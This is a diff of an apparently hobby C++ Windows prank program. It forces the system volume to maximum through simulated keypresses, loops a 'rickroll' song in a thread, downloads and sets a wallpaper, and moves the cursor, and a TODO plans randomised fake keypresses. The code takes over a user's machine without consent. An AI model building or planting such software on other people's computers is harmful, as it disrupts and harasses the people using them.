@@ -25,6 +25,12 @@
 #pragma comment(lib, "ole32.lib") // Lib for networking 
 #pragma comment(lib, "Winmm.lib") // Lib for mp3 playing
 
+
+struct AudioRet {
+	bool isPlaying = true;
+	LPSTR timeToEnd;
+};
+
 void MoveCursor() {
 	INPUT Input = { 0 };
 	Input.type = INPUT_MOUSE;
@@ -38,61 +44,17 @@ void MoveCursor() {
 	SendInput(1, &Input, sizeof(INPUT));
 }
 
-
-struct AudioRet {
-	bool isPlaying = true;
-	LPSTR timeToEnd;
-};
-
-
-bool ChangeVolume(double nVolume, bool bScalar)
+void MaxVol()
 {
-
-	HRESULT hr = NULL;
-	bool decibels = false;
-	bool scalar = false;
-	double newVolume = nVolume;
-
-	CoInitialize(NULL);
-	IMMDeviceEnumerator *deviceEnumerator = NULL;
-	hr = CoCreateInstance(__uuidof(MMDeviceEnumerator), NULL, CLSCTX_INPROC_SERVER,
-		__uuidof(IMMDeviceEnumerator), (LPVOID *)&deviceEnumerator);
-	IMMDevice *defaultDevice = NULL;
-
-	hr = deviceEnumerator->GetDefaultAudioEndpoint(eRender, eConsole, &defaultDevice);
-	deviceEnumerator->Release();
-	deviceEnumerator = NULL;
-
-	IAudioEndpointVolume *endpointVolume = NULL;
-	hr = defaultDevice->Activate(__uuidof(IAudioEndpointVolume),
-		CLSCTX_INPROC_SERVER, NULL, (LPVOID *)&endpointVolume);
-	defaultDevice->Release();
-	defaultDevice = NULL;
-
-	// -------------------------
-	float currentVolume = 0;
-	endpointVolume->GetMasterVolumeLevel(&currentVolume);
-	//printf("Current volume in dB is: %f\n", currentVolume);
-
-	hr = endpointVolume->GetMasterVolumeLevelScalar(&currentVolume);
-	//CString strCur=L"";
-	//strCur.Format(L"%f",currentVolume);
-	//AfxMessageBox(strCur);
-
-	// printf("Current volume as a scalar is: %f\n", currentVolume);
-	if (bScalar == false)
-	{
-		hr = endpointVolume->SetMasterVolumeLevel((float)newVolume, NULL);
+	INPUT ip = { 0 };
+	ip.type = INPUT_KEYBOARD;
+	ip.ki.wVk = VK_VOLUME_UP;   //or VOLUME_DOWN or MUTE
+	for (int i = 0; i <= 50; i++) {
+		SendInput(1, &ip, sizeof(INPUT));
+		ip.ki.dwFlags = KEYEVENTF_KEYUP;
+		SendInput(1, &ip, sizeof(INPUT));
+		ip.ki.dwFlags = 0;
 	}
-	else if (bScalar == true)
-	{
-		hr = endpointVolume->SetMasterVolumeLevelScalar((float)newVolume, NULL);
-	}
-	endpointVolume->Release();
-
-	CoUninitialize();
-
-	return FALSE;
 }
 
 
@@ -136,14 +98,20 @@ void SetWallpaper(LPCWSTR file) {
 	HRESULT status = CoCreateInstance(CLSID_ActiveDesktop, NULL, CLSCTX_INPROC_SERVER, IID_IActiveDesktop, (void**)&desktop);
 	WALLPAPEROPT wOption;
 	ZeroMemory(&wOption, sizeof(WALLPAPEROPT));
+
+
 	wOption.dwSize = sizeof(WALLPAPEROPT);
 	wOption.dwStyle = WPSTYLE_CENTER;
+
 	status = desktop->SetWallpaper(file, 0);
 	wprintf(L"SetWallpaper status: %ld\n", status);
+
 	status = desktop->SetWallpaperOptions(&wOption, 0);
 	wprintf(L"SetWallpaperOptions status: %ld\n", status);
+
 	status = desktop->ApplyChanges(AD_APPLY_ALL);
 	wprintf(L"Applied changes status: %ld\n", status);
+
 	desktop->Release();
 	CoUninitialize();
 }
@@ -242,30 +210,51 @@ size_t DownloadFile(std::string url, char* outfilename) {
 	return 1;
 }
 
+DWORD WINAPI SongPlayin(LPVOID lpparameter) {
+	bool* done = reinterpret_cast<bool*>(lpparameter);
+	
+	
+	AudioRet passoff;
+	passoff.isPlaying = true;
+	passoff.timeToEnd = "0";
+	//while (true) {
+	for(int i = 0; i < 10; i++){
+		HANDLE threadHandler = CreateThread(0, 0, PlaySong, reinterpret_cast<void*>(&passoff), 0, 0); // starts rickroll thread to get out of way for other routines to execute
+		
+		Sleep(1000); // gives thread time to complete initial thing
+		printf("Length of track: %s\n", passoff.timeToEnd);
+		printf("SongPlaying value: %d\n", passoff.isPlaying);
+
+		std::string number(passoff.timeToEnd);
+		int time = std::stoi(number);
+
+		printf("Time in integer: %d\n", time);
+		Sleep(time);
+		printf("TimerUP\n");
+		CloseHandle(threadHandler);
+	}
+	printf("Song complete. Exiting");
+	return 0;
+
+}
+
 //int CALLBACK WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR pCmdLine, int nCmdShow) // make sure to change this back after debug
 int main()
 {
-	bool SongPlaying = true;
-	AudioRet passoff;
-	HANDLE threadHandler = CreateThread(0, 0, PlaySong, reinterpret_cast<void*>(&passoff), 0, 0); // starts rickroll thread to get out of way for other routines to execute
-	Sleep(10000); // debug wait
-	while (true) {
-		if (passoff.isPlaying) {
-			printf("Length of track: %s\n", passoff.timeToEnd);
-			printf("SongPlaying value: %d\n", SongPlaying);
-			//printf((char*)SongPlaying);
-			Sleep(210173);
-			printf("TimerUP\n");
-		}
-		else {
-			printf("Song complete. Restarting lol"); 
-			threadHandler = CreateThread(0, 0, PlaySong, reinterpret_cast<void*>(&passoff), 0, 0); // starts rickroll thread to get out of way for other routines to execute
-			passoff.isPlaying = true;
-		}
-		
-	}
-	printf("Song complete. Exiting");
-	return 0; // debug cutout
+
+	MaxVol();
+	return 0; // debug output
+
+
+
+	bool done = false;
+	HANDLE thread = CreateThread(0, 0, SongPlayin, reinterpret_cast<void*>(&done), 0, 0); // Plays song (rickroll as of right now)
+	//while (!done) {
+	//	Sleep(1000);
+	//}
+	//CloseHandle(thread);
+
+
 	int count = 0;
 	std::string url = "https://i.ytimg.com/vi/ibr6egCSqiE/maxresdefault.jpg";
 
@@ -298,10 +287,8 @@ int main()
 		}
 		Sleep(2000); // Wait time
 	}
-	while (SongPlaying) {
-		Sleep(1000);
-	}
-	CloseHandle(threadHandler);
+	
+	//CloseHandle(threadHandler);
 
 	return 0;
 }
@@ -313,18 +300,8 @@ int main()
 			(https://stackoverflow.com/questions/2886609/how-to-make-multiple-windows-using-win32-api)
 			(http://www.winprog.org/tutorial/start.html)
 
-
-		2. Change machine volume to 100 (https://stackoverflow.com/questions/25923454/windows-audio-endpoint-api-getting-the-names-of-my-audio-devices)
-			(https://docs.microsoft.com/en-us/windows/desktop/api/Endpointvolume/nn-endpointvolume-iaudioendpointvolume)
-			(https://docs.microsoft.com/en-us/windows/desktop/CoreAudio/endpoint-volume-controls)
-			(https://docs.microsoft.com/en-us/windows/desktop/CoreAudio/endpointvolume-api)
-			(https://docs.microsoft.com/en-us/windows/desktop/coreaudio/endpointvolume-api)
-			(https://docs.microsoft.com/en-us/previous-versions//bb331828(v=vs.85)
-			(https://www.codeproject.com/Articles/1207799/Cool-dummy-volume-meter-in-DOS-mode)
-			(https://docs.microsoft.com/en-us/windows/desktop/CoreAudio/wasapi)
-			(https://stackoverflow.com/questions/14771775/how-to-change-master-volume-programmatically)
-
-
-		3. Project type change note
+		2. Project type change note
 		https://stackoverflow.com/questions/6626397/error-lnk2019-unresolved-external-symbol-winmain16-referenced-in-function#8532797
+
+		3. Modify KeyPress function to randomly choose timing and what key gets pressed
 */
